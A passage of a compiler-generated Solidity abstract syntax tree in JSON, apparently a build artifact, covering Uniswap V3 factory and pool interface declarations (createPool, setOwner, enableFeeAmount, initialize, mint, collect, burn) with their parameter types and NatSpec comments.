												"id": 1629,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1634,
												"src": "2692:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1628,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "2692:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2634:74:1"
									},
									"returnParameters": {
										"id": 1633,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1632,
												"mutability": "mutable",
												"name": "pool",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1634,
												"src": "2732:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1631,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2732:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2731:14:1"
									},
									"scope": 1661,
									"src": "2618:128:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1635,
										"nodeType": "StructuredDocumentation",
										"src": "2752:554:1",
										"text": "@notice Creates a pool for the given two tokens and fee\n @param tokenA One of the two tokens in the desired pool\n @param tokenB The other of the two tokens in the desired pool\n @param fee The desired fee for the pool\n @dev tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved\n from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments\n are invalid.\n @return pool The address of the newly created pool"
									},
									"functionSelector": "a1671295",
									"id": 1646,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "createPool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1642,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1637,
												"mutability": "mutable",
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1646,
												"src": "3340:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1636,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3340:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1639,
												"mutability": "mutable",
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1646,
												"src": "3364:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1638,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3364:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1641,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1646,
												"src": "3388:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1640,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "3388:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3330:74:1"
									},
									"returnParameters": {
										"id": 1645,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1644,
												"mutability": "mutable",
												"name": "pool",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1646,
												"src": "3423:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1643,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3423:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3422:14:1"
									},
									"scope": 1661,
									"src": "3311:126:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1647,
										"nodeType": "StructuredDocumentation",
										"src": "3443:144:1",
										"text": "@notice Updates the owner of the factory\n @dev Must be called by the current owner\n @param _owner The new owner of the factory"
									},
									"functionSelector": "13af4035",
									"id": 1652,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setOwner",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1650,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1649,
												"mutability": "mutable",
												"name": "_owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1652,
												"src": "3610:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1648,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3610:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3609:16:1"
									},
									"returnParameters": {
										"id": 1651,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3634:0:1"
									},
									"scope": 1661,
									"src": "3592:43:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1653,
										"nodeType": "StructuredDocumentation",
										"src": "3641:326:1",
										"text": "@notice Enables a fee amount with the given tickSpacing\n @dev Fee amounts may never be removed once enabled\n @param fee The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\n @param tickSpacing The spacing between ticks to be enforced for all pools created with the given fee amount"
									},
									"functionSelector": "8a7c195f",
									"id": 1660,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "enableFeeAmount",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1658,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1655,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1660,
												"src": "3997:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1654,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "3997:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1657,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1660,
												"src": "4009:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1656,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "4009:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3996:31:1"
									},
									"returnParameters": {
										"id": 1659,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "4036:0:1"
									},
									"scope": 1661,
									"src": "3972:65:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1662,
							"src": "234:3805:1"
						}
					],
					"src": "45:3995:1"
				},
				"id": 1
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
					"exportedSymbols": {
						"IUniswapV3Pool": [
							1683
						]
					},
					"id": 1684,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1663,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:2"
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol",
							"file": "./pool/IUniswapV3PoolImmutables.sol",
							"id": 1664,
							"nodeType": "ImportDirective",
							"scope": 1684,
							"sourceUnit": 1970,
							"src": "71:45:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol",
							"file": "./pool/IUniswapV3PoolState.sol",
							"id": 1665,
							"nodeType": "ImportDirective",
							"scope": 1684,
							"sourceUnit": 2104,
							"src": "117:40:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol",
							"file": "./pool/IUniswapV3PoolDerivedState.sol",
							"id": 1666,
							"nodeType": "ImportDirective",
							"scope": 1684,
							"sourceUnit": 1811,
							"src": "158:47:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol",
							"file": "./pool/IUniswapV3PoolActions.sol",
							"id": 1667,
							"nodeType": "ImportDirective",
							"scope": 1684,
							"sourceUnit": 1780,
							"src": "206:42:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol",
							"file": "./pool/IUniswapV3PoolOwnerActions.sol",
							"id": 1668,
							"nodeType": "ImportDirective",
							"scope": 1684,
							"sourceUnit": 1996,
							"src": "249:47:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol",
							"file": "./pool/IUniswapV3PoolEvents.sol",
							"id": 1669,
							"nodeType": "ImportDirective",
							"scope": 1684,
							"sourceUnit": 1930,
							"src": "297:41:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1671,
										"name": "IUniswapV3PoolImmutables",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1969,
										"src": "637:24:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolImmutables_$1969",
											"typeString": "contract IUniswapV3PoolImmutables"
										}
									},
									"id": 1672,
									"nodeType": "InheritanceSpecifier",
									"src": "637:24:2"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1673,
										"name": "IUniswapV3PoolState",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2103,
										"src": "667:19:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolState_$2103",
											"typeString": "contract IUniswapV3PoolState"
										}
									},
									"id": 1674,
									"nodeType": "InheritanceSpecifier",
									"src": "667:19:2"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1675,
										"name": "IUniswapV3PoolDerivedState",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1810,
										"src": "692:26:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolDerivedState_$1810",
											"typeString": "contract IUniswapV3PoolDerivedState"
										}
									},
									"id": 1676,
									"nodeType": "InheritanceSpecifier",
									"src": "692:26:2"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1677,
										"name": "IUniswapV3PoolActions",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1779,
										"src": "724:21:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolActions_$1779",
											"typeString": "contract IUniswapV3PoolActions"
										}
									},
									"id": 1678,
									"nodeType": "InheritanceSpecifier",
									"src": "724:21:2"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1679,
										"name": "IUniswapV3PoolOwnerActions",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1995,
										"src": "751:26:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolOwnerActions_$1995",
											"typeString": "contract IUniswapV3PoolOwnerActions"
										}
									},
									"id": 1680,
									"nodeType": "InheritanceSpecifier",
									"src": "751:26:2"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 1681,
										"name": "IUniswapV3PoolEvents",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1929,
										"src": "783:20:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IUniswapV3PoolEvents_$1929",
											"typeString": "contract IUniswapV3PoolEvents"
										}
									},
									"id": 1682,
									"nodeType": "InheritanceSpecifier",
									"src": "783:20:2"
								}
							],
							"contractDependencies": [
								1779,
								1810,
								1929,
								1969,
								1995,
								2103
							],
							"contractKind": "interface",
							"documentation": {
								"id": 1670,
								"nodeType": "StructuredDocumentation",
								"src": "340:265:2",
								"text": "@title The interface for a Uniswap V3 Pool\n @notice A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform\n to the ERC20 specification\n @dev The pool interface is broken up into many smaller pieces"
							},
							"fullyImplemented": false,
							"id": 1683,
							"linearizedBaseContracts": [
								1683,
								1929,
								1995,
								1779,
								1810,
								2103,
								1969
							],
							"name": "IUniswapV3Pool",
							"nodeType": "ContractDefinition",
							"nodes": [],
							"scope": 1684,
							"src": "605:203:2"
						}
					],
					"src": "45:764:2"
				},
				"id": 2
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol",
					"exportedSymbols": {
						"IUniswapV3PoolActions": [
							1779
						]
					},
					"id": 1780,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1685,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:3"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1686,
								"nodeType": "StructuredDocumentation",
								"src": "71:102:3",
								"text": "@title Permissionless pool actions\n @notice Contains pool methods that can be called by anyone"
							},
							"fullyImplemented": false,
							"id": 1779,
							"linearizedBaseContracts": [
								1779
							],
							"name": "IUniswapV3PoolActions",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 1687,
										"nodeType": "StructuredDocumentation",
										"src": "211:206:3",
										"text": "@notice Sets the initial price for the pool\n @dev Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\n @param sqrtPriceX96 the initial sqrt price of the pool as a Q64.96"
									},
									"functionSelector": "f637731d",
									"id": 1692,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "initialize",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1690,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1689,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1692,
												"src": "442:20:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1688,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "442:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "441:22:3"
									},
									"returnParameters": {
										"id": 1691,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "472:0:3"
									},
									"scope": 1779,
									"src": "422:51:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1693,
										"nodeType": "StructuredDocumentation",
										"src": "479:1029:3",
										"text": "@notice Adds liquidity for the given recipient/tickLower/tickUpper position\n @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback\n in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends\n on tickLower, tickUpper, the amount of liquidity, and the current price.\n @param recipient The address for which the liquidity will be created\n @param tickLower The lower tick of the position in which to add liquidity\n @param tickUpper The upper tick of the position in which to add liquidity\n @param amount The amount of liquidity to mint\n @param data Any data that should be passed through to the callback\n @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\n @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
									},
									"functionSelector": "3c8a7d8d",
									"id": 1710,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "mint",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1704,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1695,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1710,
												"src": "1536:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1694,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1536:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1697,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1710,
												"src": "1563:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1696,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1563:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1699,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1710,
												"src": "1588:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1698,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1588:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1701,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1710,
												"src": "1613:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1700,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1613:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1703,
												"mutability": "mutable",
												"name": "data",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1710,
												"src": "1637:19:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1702,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "1637:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1526:136:3"
									},
									"returnParameters": {
										"id": 1709,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1706,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1710,
												"src": "1681:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1705,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1681:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1708,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1710,
												"src": "1698:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1707,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1698:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1680:34:3"
									},
									"scope": 1779,
									"src": "1513:202:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1711,
										"nodeType": "StructuredDocumentation",
										"src": "1721:1053:3",
										"text": "@notice Collects tokens owed to a position\n @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n @param recipient The address which should receive the fees collected\n @param tickLower The lower tick of the position for which to collect fees\n @param tickUpper The upper tick of the position for which to collect fees\n @param amount0Requested How much token0 should be withdrawn from the fees owed\n @param amount1Requested How much token1 should be withdrawn from the fees owed\n @return amount0 The amount of fees collected in token0\n @return amount1 The amount of fees collected in token1"
									},
									"functionSelector": "4f1eb3d8",
									"id": 1728,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "collect",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1722,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1713,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1728,
												"src": "2805:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1712,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2805:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1715,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1728,
												"src": "2832:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1714,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2832:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1717,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1728,
												"src": "2857:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1716,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2857:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1719,
												"mutability": "mutable",
												"name": "amount0Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1728,
												"src": "2882:24:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1718,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2882:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1721,
												"mutability": "mutable",
												"name": "amount1Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1728,
												"src": "2916:24:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1720,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2916:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2795:151:3"
									},
									"returnParameters": {
										"id": 1727,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1724,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1728,
												"src": "2965:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1723,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2965:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1726,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1728,
												"src": "2982:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1725,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2982:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2964:34:3"
									},
									"scope": 1779,
									"src": "2779:220:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1729,
										"nodeType": "StructuredDocumentation",
										"src": "3005:631:3",
										"text": "@notice Burn liquidity from the sender and account tokens owed for the liquidity to the position\n @dev Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0\n @dev Fees must be collected separately via a call to #collect\n @param tickLower The lower tick of the position for which to burn liquidity\n @param tickUpper The upper tick of the position for which to burn liquidity\n @param amount How much liquidity to burn\n @return amount0 The amount of token0 sent to the recipient\n @return amount1 The amount of token1 sent to the recipient"
									},
									"functionSelector": "a34123a7",
									"id": 1742,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "burn",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1736,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1731,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1742,
												"src": "3664:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1730,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3664:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1733,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1742,
												"src": "3689:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1732,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3689:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1735,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1742,
												"src": "3714:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1734,
													"name": "uint128",
